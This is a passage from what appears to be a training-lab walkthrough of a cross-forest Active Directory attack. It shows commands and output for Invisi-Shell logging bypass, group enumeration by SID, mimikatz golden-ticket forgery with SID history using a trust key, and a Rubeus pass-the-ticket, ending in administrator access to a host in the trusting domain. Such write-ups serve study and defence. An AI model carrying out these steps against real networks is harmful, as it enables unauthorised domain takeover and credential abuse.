  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  GJ0Y0d70hfLjNx2WwtoHP3rvp2gnubd4ygl6hHcEHlc=


```

validate the tickets:

```
C:\Users\Public>klist
klist

Current LogonId is 0:0xb9e82e

Cached Tickets: (2)

#0>     Client: Administrator @ eu.local
        Server: krbtgt/EU.LOCAL @ EU.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/4/2023 8:18:32 (local)
        End Time:   3/4/2023 18:18:32 (local)
        Renew Time: 3/11/2023 8:18:32 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ eu.local
        Server: CIFS/euvendor-dc.euvendor.local @ EUVENDOR.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/4/2023 8:26:14 (local)
        End Time:   3/4/2023 18:26:14 (local)
        Renew Time: 3/11/2023 8:26:14 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

Access tu euvendor-dc:

```
C:\Users\Public>dir \\euvendor-dc.euvendor.local\eushare
dir \\euvendor-dc.euvendor.local\eushare
 Volume in drive \\euvendor-dc.euvendor.local\eushare has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of \\euvendor-dc.euvendor.local\eushare

07/14/2019  05:12 AM    <DIR>          .
07/14/2019  05:12 AM    <DIR>          ..
07/14/2019  05:13 AM                37 shared.txt
               1 File(s)             37 bytes
               2 Dir(s)  14,919,471,104 bytes free

C:\Users\Public>type \\euvendor-dc.euvendor.local\eushare\shared.txt
type \\euvendor-dc.euvendor.local\eushare\shared.txt
Shared with Domain Admins of eu.local
```

## Access euvendor net using powershell remoting

Accesss to eu-dc.eu.local:

```
C:\Windows\system32>winrs -r:eu-dc.eu.local cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>hostname
hostname
EU-DC

C:\Users\Administrator>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::f7f9:b2b9:5130:1891%3
   IPv4 Address. . . . . . . . . . . : 192.168.12.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.12.254


```
Run Invisishell and import AD module:

```
C:\Users\Public\RunWithRegistryNonAdmin.bat

C:\Users\Public>set COR_ENABLE_PROFILING=1

C:\Users\Public>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\InShellProf.dll" /f
The operation completed successfully.

C:\Users\Public>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Public> Import-Module C:\Users\Public\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\Users\Public\Microsoft.ActiveDirectory.Management.dll
PS C:\Users\Public> Import-Module C:\Users\Public\ActiveDirectory.psd1
Import-Module C:\Users\Public\ActiveDirectory.psd1
```

As we know the SID of the Trust domain: S-1-5-21-4066061358-3942393892-617142613 it's possible looking for groups in the domain with administration privileges upper to -1000:
```
PS C:\Users\Public> Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server euvendor.local
Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server euvendor.local


DistinguishedName : CN=DnsAdmins,CN=Users,DC=euvendor,DC=local
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : DnsAdmins
ObjectClass       : group
ObjectGUID        : 558b62ba-e634-4bda-91cf-9d6e9c9aaee8
SamAccountName    : DnsAdmins
SID               : S-1-5-21-4066061358-3942393892-617142613-1101

DistinguishedName : CN=DnsUpdateProxy,CN=Users,DC=euvendor,DC=local
GroupCategory     : Security
GroupScope        : Global
Name              : DnsUpdateProxy
ObjectClass       : group
ObjectGUID        : 8b8804e3-3914-49c3-8b51-562c0644d60d
SamAccountName    : DnsUpdateProxy
SID               : S-1-5-21-4066061358-3942393892-617142613-1102

DistinguishedName : CN=EUAdmins,CN=Users,DC=euvendor,DC=local
GroupCategory     : Security
GroupScope        : Global
Name              : EUAdmins
ObjectClass       : group
ObjectGUID        : 1dad0633-fcf5-49dc-9431-8b167cf36969
SamAccountName    : euadmins
SID               : S-1-5-21-4066061358-3942393892-617142613-1103

```
Using the same technique that in the previous section it's possible create a new Kerberos intra-golden for this service:

```

PS C:\Users\Public> C:\Users\Public\mimikatz.exe
C:\Users\Public\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:93172cd5469514038b20ce9088ed63ea /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\euvendornet.kirbi
User      : Administrator
Domain    : eu.local (EU)
SID       : S-1-5-21-3657428294-2017276338-1274645009
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-4066061358-3942393892-617142613-1103 ;
ServiceKey: 93172cd5469514038b20ce9088ed63ea - rc4_hmac_nt
Service   : krbtgt
Target    : euvendor.local
Lifetime  : 3/4/2023 8:52:18 AM ; 3/1/2033 8:52:18 AM ; 3/1/2033 8:52:18 AM
-> Ticket : C:\Users\Public\euvendornet.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz # exit
```

with the exported ticket, it's possible perform a rubeus ptt on the target server euvendor-net and access to te target server with Administrator privileges using winrs:

```
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\euvendornet.kirbi /service:HTTP/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'HTTP/euvendor-net.euvendor.local'
[*] Using domain controller: euvendor-dc.euvendor.local (192.168.12.212)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFOjCCBTagAwIBBaEDAgEWooIELzCCBCthggQnMIIEI6ADAgEFoRAbDkVVVkVORE9SLkxPQ0FMoi4w
      LKADAgECoSUwIxsESFRUUBsbZXV2ZW5kb3ItbmV0LmV1dmVuZG9yLmxvY2Fso4ID2DCCA9SgAwIBEqED
      AgEBooIDxgSCA8JtXcbUQVImDuwF3tkdlkhO6NkBT1MlK88xqxrv66COPUpvV3Hnaq63cNVCS91YrL5L
      dvvd0Af5wHrfqHfgVLSbTd66iTiKp/aDYLDyuiGp1QUDE6X6ij9uVUWCcrcay2dz7FhIWNllb4vGWeFE
      h8/h8UW7TiCLIfNu0K/A0hacixIixHZjTxi2VCmUdaEohhzcAz6B8YAjkcrAImWOjyslMAuSMcmAPnoa
      Hc+cTA3L5+6ykfFk4Y28g9qNAfPvF+GqrwOcVY5gIAj8vqyQrBfzBGozyw52FGPsmCSlVvnzK8nqQVeF
      LEyYQF66UGz7m43JOfNV8unL9sCS9CxhaqlIq3CmiG2EffQAUhxSm+QqH+9p75WqoP5v/9usruXXslqr
      JwiynwKxqqvVEmT+3pWccUKjuLjRELmF2z5EFtWHFAg8ZB4ZT3939Y1by1a1LfVAHGz5/85TsaLn6zBm
      H/ODsOIwJvfS15pGC7qdWZhdmBpVBgulzSF7RldeS18ZzUTFixekFBR6wxj0Fd/aMANN6Hm/OOYrjlLq
      4NjVwSyXk64HCxnkdGovxTaNxlf/L+7mXk2FSDHVaCJnR8+eH4iS6YzTgjtztq7vIm8ymTF/pkf/v3LK
      3hqit9snUN4kv/vGCBd5UWonTDYDv6MdslxI1zb5XVs4fAj1p8ZdZyvFhUroiKrRQ3V4SLSXECw4AV6Z
      kzWMLidtkFtXfg597iQ+VB3uDDoUnloeveRCbWIuvBr92qgfniqfQ8U+hxZ9Xa0Ak+XP+GEo9+q+ADrt
      7mtWRgx0FEJrgE9S0ZUshD15XESI6BDaZypntXwazvjou5RvRAYKC9w88Vi+DtH9JnNRKKrvP7pWSxk7
      KQ7Zl3fFYzLViFAVmKF3xV8fd0t7t8+1m3PnV/0+2B7iIXp5FbeW/EDHIFXpdCzYdwHLk51Q1u3pD6jg
      dy9yUKwbfJUPDeShvfajhooAjq1jeCgB2lcCLA1HLqZxsz7TElZf8oeD8owy8aJ51PU2SbKGmgUFk/Gl
      DUU6GOsvl47otVc0lyPm22yFFZU1EBz1RO10y1HVn2LT4+AYHiotDBNIySj5sCjd6328LKevEmcyZki9
      AgElrH1m4RL822/k1EuPTSG88Sl5Ken+kg1a4gdkwEbRMt2Sig6dX3YbZKYJ6F6j4DAXvGX6orsAk43f
      O5TzjUctkW5jkRBUcWmcPvQujfvY8XkTA4vXYQytN5k1Hs0/hnH2qPcPMCAMPdKNOFuGRvCZoDiGITbZ
      75hB8aZFFy79fMX9UqOB9jCB86ADAgEAooHrBIHofYHlMIHioIHfMIHcMIHZoCswKaADAgESoSIEIBw/
      /yln1ZfCEauABmgILAUk3t4seIFTIJd6iU8g6o4goQobCGV1LmxvY2FsohowGKADAgEBoREwDxsNQWRt
      aW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDIzMDMwNDE2NTQxOFqmERgPMjAyMzAzMDUwMjU0MThapxEY
      DzIwMjMwMzExMTY1NDE4WqgQGw5FVVZFTkRPUi5MT0NBTKkuMCygAwIBAqElMCMbBEhUVFAbG2V1dmVu
      ZG9yLW5ldC5ldXZlbmRvci5sb2NhbA==

  ServiceName              :  HTTP/euvendor-net.euvendor.local
  ServiceRealm             :  EUVENDOR.LOCAL
  UserName                 :  Administrator
  UserRealm                :  eu.local
  StartTime                :  3/4/2023 8:54:18 AM
  EndTime                  :  3/4/2023 6:54:18 PM
  RenewTill                :  3/11/2023 8:54:18 AM
  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  HD//KWfVl8IRq4AGaAgsBSTe3ix4gVMgl3qJTyDqjiA=


```

Validate tickets:

```
#3>     Client: Administrator @ eu.local
        Server: HTTP/euvendor-net.euvendor.local @ EUVENDOR.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 3/4/2023 8:54:18 (local)
        End Time:   3/4/2023 18:54:18 (local)
        Renew Time: 3/11/2023 8:54:18 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

And finally access:

```
C:\Users\Public>winrs -r:euvendor-net.euvendor.local cmd
winrs -r:euvendor-net.euvendor.local cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.EU>whoami
whoami
eu\administrator

C:\Users\Administrator.EU>hostname
hostname
EUVendor-Net

C:\Users\Administrator.EU>
```
